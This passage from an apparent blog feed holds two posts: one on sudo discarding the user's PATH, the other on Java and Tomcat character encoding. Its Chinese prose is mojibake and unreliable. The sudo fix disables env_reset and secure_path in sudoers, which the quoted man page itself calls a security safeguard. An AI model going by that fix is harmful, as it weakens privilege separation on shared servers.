<li><strong>interactive</strong> shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal (non-login) or a virtual terminal (login). In an interactive shell the prompt variable must be set (<code>$PS1</code>). Sourced files:<ul>
<li><code>/etc/profile</code> and <code>~/.profile</code></li>
<li><code>/etc/bashrc</code> or <code>/etc/bash.bashrc</code> for bash</li>
</ul>
</li>
<li><strong>non-interactive</strong> shell: A (sub)shell that is probably run from an automated process you will see neither input nor outputm when the calling process donâ€™t handle it. That shell is normally a non-login shell, because the calling user has logged in already. A shell running a script is always a non-interactive shell, but the script can emulate an interactive shell by prompting the user to input values. Sourced files:<ul>
<li><code>/etc/bashrc</code> or <code>/etc/bash.bashrc</code> for bash (but, mostly you see this at the beginning of the script: <code>[ -z &quot;$PS1&quot; ] &amp;&amp; return</code>. That means donâ€™t do anything if itâ€™s a non-interactive shell)</li>
<li>depending on shell; some of them read the file in the <code>$ENV</code> variable</li>
</ul>
</li>
</ul>
<h4 id="ç”¨sudo-iå°±å¥½äº†ï¼Ÿ"><a href="#ç”¨sudo-iå°±å¥½äº†ï¼Ÿ" class="headerlink" title="ç”¨sudo -iå°±å¥½äº†ï¼Ÿ"></a>ç”¨<code>sudo -i</code>å°±å¥½äº†ï¼Ÿ</h4><p>ç”¨<code>sudo -i</code>çš„é—®é¢˜æ˜¯å½“å‰ç›®å½•è¢«æ›´æ”¹äº†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i -u tomcat env | grep PWD --color</span><br><span class="line">PWD=/home/tomcat</span><br></pre></td></tr></table></figure>
<p>ä¸æ³¨æ„çš„è¯å°±æ‰å‘é‡Œäº†ï¼Œæ˜æ˜å½“å‰ç›®å½•æœ‰è„šæœ¬å´æ‰§è¡Œä¸äº†ã€‚</p>
<h4 id="æ›´å¥½çš„è§£å†³åŠæ³•"><a href="#æ›´å¥½çš„è§£å†³åŠæ³•" class="headerlink" title="æ›´å¥½çš„è§£å†³åŠæ³•"></a>æ›´å¥½çš„è§£å†³åŠæ³•</h4><p>æ‰§è¡Œsudoå‘½ä»¤æ—¶ï¼Œ<code>PATH</code>ä¹‹æ‰€ä»¥ä¼šæ”¹å˜ï¼Œèµ·å§‹æ˜¯ä¸€ç§å®‰å…¨ç­–ç•¥ï¼Œé˜²æ­¢ç”¨æˆ·çš„è·¯å¾„æ±¡æŸ“sudoçš„è·¯å¾„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">secure_path   Path used for every command run from sudo.  If you don&apos;t</span><br><span class="line">               trust the people running sudo to have a sane PATH environâ€</span><br><span class="line">               ment variable you may want to use this.  Another use is if</span><br><span class="line">               you want to have the â€œroot pathâ€ be separate from the â€œuser</span><br><span class="line">               pathâ€.  Users in the group specified by the exempt_group</span><br><span class="line">               option are not affected by secure_path.  This option is not</span><br><span class="line">               set by default.</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸‹æˆ‘ä»¬çº¿ä¸Šæœºå™¨çš„é…ç½®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo visudo</span><br><span class="line"></span><br><span class="line">Defaults    env_reset</span><br><span class="line">Defaults    env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Adding HOME to env_keep may enable a user to run unrestricted</span></span><br><span class="line"><span class="comment"># commands via sudo.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Defaults   env_keep += "HOME"</span></span><br><span class="line"></span><br><span class="line">Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span><br></pre></td></tr></table></figure>
<p><code>secure_path = /sbin:/bin:/usr/sbin:/usr/bin</code>åªè®¾ç½®äº†è¿™äº›è·¯å¾„ï¼Œ å’Œæˆ‘ä»¬åœ¨ä¸Šé¢çœ‹åˆ°çš„è¾“å‡ºä¸€è‡´ã€‚<code>JDK</code>çš„binç›®å½•æ²¡æœ‰åŠ å…¥æŸ¥æ‰¾è·¯å¾„ï¼Œæ‰€ä»¥æ‰¾ä¸åˆ°å‘½ä»¤ä¹Ÿå°±ä¸å¥‡æ€ªäº†ã€‚</p>
<p>å½“ç„¶<code>env_keep</code>å¯ä»¥ä¿ç•™ä¸€äº›ç¯å¢ƒå˜é‡åˆ°sudoå‘½ä»¤çš„ç¯å¢ƒä¸­ï¼Œä½†æ˜¯æ— æ³•ä¿ç•™<code>PATH</code>ï¼Œåšå¦‚ä¸‹ä¿®æ”¹ï¼Œå°±å¯ä»¥ä¸é‡ç½®ç¯å¢ƒå˜é‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######## ç¬¬ä¸€å¤„ä¿®æ”¹ï¼Œè¿™é‡Œå–åï¼Œè¡¨ç¤ºä¸é‡ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line">Defaults    !env_reset</span><br><span class="line">Defaults    env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Adding HOME to env_keep may enable a user to run unrestricted</span></span><br><span class="line"><span class="comment"># commands via sudo.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Defaults   env_keep += "HOME"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######## ç¬¬äºŒå¤„ä¿®æ”¹</span></span><br><span class="line"><span class="comment">#Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span></span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ä¹‹åæˆ‘ä»¬çœ‹çœ‹å¯¹åº”çš„ç¯å¢ƒå˜é‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_01 ~]$ sudo -u tomcat env</span><br><span class="line">XDG_SESSION_ID=111674</span><br><span class="line">HOSTNAME=yd_app_api_01</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_CLIENT=47.97.217.12 35698 22</span><br><span class="line">SSH_TTY=/dev/pts/5</span><br><span class="line">USER=tomcat</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">MAIL=/var/spool/mail/qisheng.li</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/jdk/default/bin:/usr/<span class="built_in">local</span>/bin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/usr/sbin:/home/qisheng.li/.<span class="built_in">local</span>/bin:/home/qisheng.li/bin</span><br><span class="line">PWD=/home/qisheng.li</span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">SHLVL=1</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">CLASSPATH=.:/usr/<span class="built_in">local</span>/jdk/default/lib/dt.jar:/usr/<span class="built_in">local</span>/jdk/default/lib/tools.jar</span><br><span class="line">SSH_CONNECTION=47.97.217.12 35698 192.168.2.11 22</span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">XDG_RUNTIME_DIR=/run/user/1025</span><br><span class="line">_=/usr/bin/sudo</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">SUDO_COMMAND=/usr/bin/env</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1025</span><br><span class="line">SUDO_GID=1025</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>JAVA_HOME</code>å’Œ<code>PATH</code>éƒ½æœ‰äº†ï¼Œè¿™ä¸ªå’Œ<code>qisheng.li</code>çš„ç¯å¢ƒå˜é‡æ˜¯ä¸€è‡´çš„ï¼Œé™äºç¯‡å¹…ï¼Œè¿™é‡Œå°±ä¸è´´å‡ºæ¥äº†ã€‚</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
<li><a href="http://feihu.me/blog/2014/env-problem-when-ssh-executing-command-on-remote/" rel="external nofollow noopener noreferrer" target="_blank">sshè¿æ¥è¿œç¨‹ä¸»æœºæ‰§è¡Œè„šæœ¬çš„ç¯å¢ƒå˜é‡é—®é¢˜</a></li>
<li><a href="https://unix.stackexchange.com/questions/170493/login-non-login-and-interactive-non-interactive-shells" rel="external nofollow noopener noreferrer" target="_blank">bash - login/non-login and interactive/non-interactive shells - Unix &amp; Linux Stack Exchange</a></li>
<li><a href="https://unix.stackexchange.com/questions/332948/how-does-lookup-in-path-work-under-the-hood" rel="external nofollow noopener noreferrer" target="_blank">shell - How does lookup in $PATH work under the hood? - Unix &amp; Linux Stack Exchange</a></li>
<li><a href="https://superuser.com/questions/927512/how-to-set-path-for-sudo-commands" rel="external nofollow noopener noreferrer" target="_blank">linux - How to set path for sudo commands - Super User</a></li>
<li><a href="http://perlchina.github.io/advent.perlchina.org/2009/SSHBatch.html" rel="external nofollow noopener noreferrer" target="_blank">http://perlchina.github.io/advent.perlchina.org/2009/SSHBatch.html</a>)</li>
</ol>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sudo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[javaä¸­encodingæ€»ç»“]]></title>
      <url>http://qsli.github.io/2018/08/12/java-encoding/</url>
      <content type="html"><![CDATA[<h1 id="URLConnection-ä¹±ç "><a href="#URLConnection-ä¹±ç " class="headerlink" title="URLConnection ä¹±ç "></a>URLConnection ä¹±ç </h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL realUrl = <span class="keyword">new</span> URL(<span class="string">""</span>urlNameString<span class="string">""</span>);</span><br><span class="line">URLConnection connection = realUrl.openConnection();</span><br><span class="line">OutputStreamWriter out = <span class="keyword">new</span> OutputStreamWriter(connection  </span><br><span class="line">        .getOutputStream(), <span class="string">"UTF-8"</span>);</span><br></pre></td></tr></table></figure>
<p>åœ¨è·å–<code>OutputStreamWriter</code>éœ€è¦æŒ‡å®šç¼–ç æ ¼å¼ï¼Œ å¦åˆ™ä½¿ç”¨çš„æ˜¯é»˜è®¤çš„ç¼–ç ï¼Œ æŸ¥çœ‹<code>OutputStreamWriter</code>çš„æ²¡æœ‰æŒ‡å®šç¼–ç çš„æ„é€ å‡½æ•°:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates an OutputStreamWriter that uses the default character encoding.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  out  An OutputStream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">OutputStreamWriter</span><span class="params">(OutputStream out)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(out);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        se = StreamEncoder.forOutputStreamWriter(out, <span class="keyword">this</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹<code>StreamEncoder</code>çš„<code>forOutputStreamWriter</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Factories for java.io.OutputStreamWriter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> StreamEncoder <span class="title">forOutputStreamWriter</span><span class="params">(OutputStream out,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      Object lock,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      String charsetName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> UnsupportedEncodingException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String csn = charsetName;</span><br><span class="line">        <span class="keyword">if</span> (csn == <span class="keyword">null</span>)</span><br><span class="line">            csn = Charset.defaultCharset().name();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Charset.isSupported(csn))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> StreamEncoder(out, lock, Charset.forName(csn));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalCharsetNameException x) &#123; &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedEncodingException (csn);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ å¦‚æœæ²¡æœ‰ä¼ å…¥ç¼–ç åç§°ï¼Œç”¨çš„æ˜¯é»˜è®¤çš„ç¼–ç æ–¹å¼ï¼Œè¿™ä¸ª<code>Charset.defaultCharset().name()</code>åœ¨windowsä¸Šé»˜è®¤æ˜¯<code>GBK</code>ï¼Œè¿™ä¸ªå¯ä»¥åœ¨<code>JDK</code>å¯åŠ¨çš„æ—¶å€™æŒ‡å®šå‚æ•°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure>
<h1 id="Tomcatä¹±ç "><a href="#Tomcatä¹±ç " class="headerlink" title="Tomcatä¹±ç "></a>Tomcatä¹±ç </h1><h2 id="URIç¼–ç "><a href="#URIç¼–ç " class="headerlink" title="URIç¼–ç "></a>URIç¼–ç </h2><p>æŒ‡å®šä¸º<code>UTF-8</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">maxThreads</span>=<span class="string">"150"</span> <span class="attr">minSpareThreads</span>=<span class="string">"25"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">maxSpareThreads</span>=<span class="string">"75"</span> <span class="attr">enableLookups</span>=<span class="string">"false"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">acceptCount</span>=<span class="string">"100"</span> <span class="attr">debug</span>=<span class="string">"99"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">disableUploadTimeout</span>=<span class="string">"true"</span> <span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>tomcat å¯¹URIé»˜è®¤çš„ç¼–ç æ˜¯<code>ISO-8859-1</code>ï¼Œåœ¨<code>Connector</code>ä¸­é…ç½®<strong>URIEncoding=â€UTF-8â€</strong> å°±å¯ä»¥æŒ‡å®šç¼–ç ã€‚</p>
<p>tomcatä¸­å…³äºç¼–ç çš„ä»£ç :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.connector.CoyoteAdapter#convertURI</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Character conversion of the URI.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">convertURI</span><span class="params">(MessageBytes uri, Request request)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteChunk bc = uri.getByteChunk();</span><br><span class="line">        <span class="keyword">int</span> length = bc.getLength();</span><br><span class="line">        CharChunk cc = uri.getCharChunk();</span><br><span class="line">        cc.allocate(length, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        String enc = connector.getURIEncoding();</span><br><span class="line">        <span class="keyword">if</span> (enc != <span class="keyword">null</span>) &#123;</span><br><span class="line">            B2CConverter conv = request.getURIConverter();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (conv == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    conv = <span class="keyword">new</span> B2CConverter(enc, <span class="keyword">true</span>);</span><br><span class="line">                    request.setURIConverter(conv);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    conv.recycle();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                log.error(<span class="string">"Invalid URI encoding; using HTTP default"</span>);</span><br><span class="line">                connector.setURIEncoding(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (conv != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conv.convert(bc, cc, <span class="keyword">true</span>);</span><br><span class="line">                    uri.setChars(cc.getBuffer(), cc.getStart(), cc.getLength());</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">                    <span class="comment">// Should never happen as B2CConverter should replace</span></span><br><span class="line">                    <span class="comment">// problematic characters</span></span><br><span class="line">                    request.getResponse().sendError(</span><br><span class="line">                            HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default encoding: fast conversion for ISO-8859-1</span></span><br><span class="line">        <span class="keyword">byte</span>[] bbuf = bc.getBuffer();</span><br><span class="line">        <span class="keyword">char</span>[] cbuf = cc.getBuffer();</span><br><span class="line">        <span class="keyword">int</span> start = bc.getStart();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            cbuf[i] = (<span class="keyword">char</span>) (bbuf[i + start] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        uri.setChars(cbuf, <span class="number">0</span>, length);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="Requestçš„ç¼–ç "><a href="#Requestçš„ç¼–ç " class="headerlink" title="Requestçš„ç¼–ç "></a>Requestçš„ç¼–ç </h2><p>è®¾ç½®äº†ä¸Šè¿°ç¼–ç åï¼Œè·å–requestçš„å‚æ•°è¿˜æ˜¯æœ‰å¯èƒ½ä¹±ç ï¼Œ æ­¤æ—¶éœ€è¦æŒ‡å®šå¯¹åº”çš„filterã€‚</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>tomcatä¸­ä¹Ÿå®ç°äº†ä¸€ä¸ªç¼–ç çš„filterï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.filters.SetCharacterEncodingFilter</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Select and set (if specified) the character encoding to be used to</span></span><br><span class="line"><span class="comment">     * interpret request parameters for this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request The servlet request we are processing</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response The servlet response we are creating</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chain The filter chain we are processing</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IOException if an input/output error occurs</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> ServletException if a servlet error occurs</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                         FilterChain chain)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Conditionally select and set the character encoding to be used</span></span><br><span class="line">        <span class="keyword">if</span> (ignore || (request.getCharacterEncoding() == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            String characterEncoding = selectEncoding(request);</span><br><span class="line">            <span class="keyword">if</span> (characterEncoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">                request.setCharacterEncoding(characterEncoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass control on to the next filter</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>web.xml</code>ä¸­çš„é…ç½®ï¼š</p>
